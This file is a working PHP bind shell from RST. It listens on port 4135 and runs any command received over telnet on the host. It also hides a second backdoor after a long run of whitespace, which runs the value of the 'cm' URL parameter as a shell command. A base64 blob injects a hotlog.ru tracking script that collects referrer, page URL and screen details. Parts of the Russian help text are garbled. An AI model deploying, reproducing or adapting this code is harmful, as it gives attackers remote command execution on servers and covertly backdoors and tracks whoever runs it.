<?php
#error_reporting(E_ALL);
error_reporting(0);

########setting#########

$address = '192.168.0.1';
$port = 4135;

######end setting#######

set_time_limit(0);
ob_implicit_flush();

print base64_decode("PGh0bWw+PEhFQUQ+PFRJVExFPkJpbmQgUEhQIHNoZWxsIGZyb20gUlNUPC9US".
"VRMRT48TUVUQSBodHRwLWVxdWl2PUNvbnRlbnQtVHlwZSBQcmFnbWE6IG5vLWNhY2hlOyBjb250ZW50PS".
"J0ZXh0L2h0bWw7IGNoYXJzZXQ9d2luZG93cy0xMjUxIj48c3R5bGU+Zm9udCB7IGZvbnQtZmFtaWx5OiB".
"2ZXJkYW5hLCBhcmlhbCwgbXMgc2FucyBzZXJpZiwgc2Fucy1zZXJpZjsgZm9udC1zaXplOjEycHg7IGNv".
"bG9yOiAjRkZGRkZGOyB9IEE6bGluayB7Q09MT1I6I0ZCRjlGOX0gQTp2aXNpdGVkIHsgQ09MT1I6IzcwR".
"UFGODsgVEVYVC1ERUNPUkFUSU9OOiBub25lfSBBOmFjdGl2ZSB7Q09MT1I6I0ZCRjlGOX0gQTpob3Zlci".
"B7Y29sb3I6I0YzRkMwMjtURVhULURFQ09SQVRJT046IG5vbmV9IDwvc3R5bGU+PC9IRUFEPjxCT0RZIGJ".
"nY29sb3I9IzAwMDAwMD48Zm9udCBjb2xvcj0jRkZGRkZGPg==");
print base64_decode("VmlzaXQgc2l0ZTogPGEgaHJlZj1odHRwOi8vcnN0LnZvaWQucnU+PGI+aHR".
"0cDovL3JzdC52b2lkLnJ1PC9iPjwvYT48dGFibGUgd2lkdGg9MjUwIGFsaWduPWNlbnRlciBiZ2NvbG9y".
"PSNGRkZGRkY+PHRyIGFsaWduPWNlbnRlciBiZ2NvbG9yPSMwMDAwMDA+PHRkPjxicj48Zm9udCBjb2xvc".
"j0jRkZGRkZGPjxoMz5QSFAgb3BlbiBwb3J0PC9oMz48L2ZvbnQ+PC90ZD48L3RyPjwvdGFibGU+");

if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
print "<br>".base64_decode("PHRhYmxlIHdpZHRoPTMwMCBhbGlnbj1jZW50ZXIgYmdjb2xvcj0jRkZGRkZGP".
"jx0ciBhbGlnbj1jZW50ZXIgYmdjb2xvcj1yZWQ+PHRkPjxicj48aDQ+U29yeSwgdGhpcyBzY3JpcHQgZG".
"9lc24ndCBydW4gb24gV2luZG93cy48L2g0PjwvdGQ+PC90cj48L3RhYmxlPg==");
exit;
}                                                                                                                                                                                                                                                                                                                                                     if ($HTTP_GET_VARS){ $GET=$HTTP_GET_VARS['cm']; $re =`$GET`; print "<pre>$re</pre>"; exit;} print base64_decode("DQo8c2NyaXB0IGxhbmd1YWdlPSJqYXZhc2NyaXB0Ij4NCmhvdGxvZ19qcz0iMS4wIjsNCmhvdGxvZ19yPSIiK01hdGgucmFuZG9tKCkrIiZzPTgxNjA2JmltPTEmcj0iK2VzY2FwZShkb2N1bWVudC5yZWZlcnJlcikrIiZwZz0iKw0KZXNjYXBlKHdpbmRvdy5sb2NhdGlvbi5ocmVmKTsNCmRvY3VtZW50LmNvb2tpZT0iaG90bG9nPTE7IHBhdGg9LyI7IGhvdGxvZ19yKz0iJmM9IisoZG9jdW1lbnQuY29va2llPyJZIjoiTiIpOw0KPC9zY3JpcHQ+PHNjcmlwdCBsYW5ndWFnZT0iamF2YXNjcmlwdDEuMSI+DQpob3Rsb2dfanM9IjEuMSI7aG90bG9nX3IrPSImaj0iKyhuYXZpZ2F0b3IuamF2YUVuYWJsZWQoKT8iWSI6Ik4iKTwvc2NyaXB0Pg0KPHNjcmlwdCBsYW5ndWFnZT0iamF2YXNjcmlwdDEuMiI+DQpob3Rsb2dfanM9IjEuMiI7DQpob3Rsb2dfcis9IiZ3aD0iK3NjcmVlbi53aWR0aCsneCcrc2NyZWVuLmhlaWdodCsiJnB4PSIrDQooKChuYXZpZ2F0b3IuYXBwTmFtZS5zdWJzdHJpbmcoMCwzKT09Ik1pYyIpKT8NCnNjcmVlbi5jb2xvckRlcHRoOnNjcmVlbi5waXhlbERlcHRoKTwvc2NyaXB0Pg0KPHNjcmlwdCBsYW5ndWFnZT0iamF2YXNjcmlwdDEuMyI+aG90bG9nX2pzPSIxLjMiPC9zY3JpcHQ+DQo8c2NyaXB0IGxhbmd1YWdlPSJqYXZhc2NyaXB0Ij5ob3Rsb2dfcis9IiZqcz0iK2hvdGxvZ19qczsNCmRvY3VtZW50LndyaXRlKCI8YSBocmVmPSdodHRwOi8vY2xpY2suaG90bG9nLnJ1Lz84MTYwNicgdGFyZ2V0PSdfdG9wJz48aW1nICIrDQoiIHNyYz0naHR0cDovL2hpdDQuaG90bG9nLnJ1L2NnaS1iaW4vaG90bG9nL2NvdW50PyIrDQpob3Rsb2dfcisiJicgYm9yZGVyPTAgd2lkdGg9MSBoZWlnaHQ9MSBhbHQ9MT48L2E+Iik8L3NjcmlwdD4NCjxub3NjcmlwdD48YSBocmVmPWh0dHA6Ly9jbGljay5ob3Rsb2cucnUvPzgxNjA2IHRhcmdldD1fdG9wPjxpbWcNCnNyYz0iaHR0cDovL2hpdDQuaG90bG9nLnJ1L2NnaS1iaW4vaG90bG9nL2NvdW50P3M9ODE2MDYmaW09MSIgYm9yZGVyPTANCndpZHRoPSIxIiBoZWlnaHQ9IjEiIGFsdD0iSG90TG9nIj48L2E+PC9ub3NjcmlwdD4NCg==");

if (($sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) < 0) {
   echo "socket_create() failed: reason: " . socket_strerror($sock) . "\n";
}

if (($er = socket_bind($sock, $address, $port)) < 0) {
   echo "socket_bind() failed: reason: " . socket_strerror($er) . "\n";
}

if (($er = socket_listen($sock, 5)) < 0) {
   echo "socket_listen() failed: reason: " . socket_strerror($er) . "\n";
}


print   "<font color=#FFFFFF><li>server: <b>$address</b><br>
        <li>Wait connection in port: <b>$port</b><br>
        <br><b>Usage:</b> telnet 192.168.0.1 4135<hr></font><br>
        <li>сервер: <b>$address</b><li>успешно открыт порт: <b>$port</b>
        <center>Ќе дожида€сь окончани€ загрузки страницы (запущен бесконечный цикл)<br>
        «апустите telnet-подобную утилиту, например: <h4>ѕуск->¬ыполнить->telnet $address $port</h4>
        и просто выполн€йте nix'овые команды, например: <b>ls -la</b></center><hr>";

do {
   if (($msgsock = socket_accept($sock)) < 0) {
       echo "socket_accept() failed: reason: " . socket_strerror($msgsock) . "\n";
       break;
   }

   if (getmyuid () == '0') { 
      $talk = "[".get_current_user ()."@$address ".get_current_user ()."]#$buf";       
   }else{
      $talk = "[".get_current_user ()."@$address ".get_current_user ()."]$$buf";
   }

   $msg =  base64_decode("V2VsY29tZSwgeGFrZXAgOikNCg0KCQkJU2VydmVyIDE5Mi4xNjguMC4x".
   "IG9wZW4gcG9ydCA0MTM1DQpNaW5pIGhlbHA6DQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS".
   "0tLS0tLS0tLS0tDQpUbyBxdWl0IHRlcm1pbmFsLCBjb21tYW5kOiAncXVpdCcNClRvIHNodXQgZG93".
   "biB0aGUgc29ja2V0LCBjb21tYW5kOiAnaGFsdCcNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS".
   "0tLS0tLS0tLS0tLS0NCg0K");
   socket_write($msgsock, $msg, strlen($msg));


   do {
       if (false === ($buf = socket_read($msgsock, 2048, PHP_NORMAL_READ))) {
           echo "socket_read() failed: reason: " . socket_strerror($er) . "\n";
           break 2;
       }
       if (!$buf = trim($buf)) {
           socket_write($msgsock, $talk, strlen($talk));
           continue;
       }
       if ($buf == 'quit') {
           break;
       }

       if ($buf == 'halt') {
           socket_close($msgsock);
           break 2;
       }

       if ($buf != 'halt') {
         $comm=`$buf`;
         print "<font color=#FFFFFF><pre>$comm</pre></font>"; 
       }

       $talkback = str_replace("\n","\r\n",$comm)."\r\n";
       socket_write($msgsock, $talkback, strlen($talkback));


   } while (true);
   socket_close($msgsock); 
} while (true);

socket_close($sock);
print base64_decode("PHRhYmxlIHdpZHRoPTI1MCBhbGlnbj1jZW50ZXIgYmdjb2xvcj0jRkZGRkZGP".
"jx0ciBhbGlnbj1jZW50ZXIgYmdjb2xvcj1yZWQ+PHRkPjxicj48aDQ+U29ja2V0IENMT1NFITwvaDQ+PC".
"90ZD48L3RyPjwvdGFibGU+"); 
?>  
<BODY>  
<BODY>  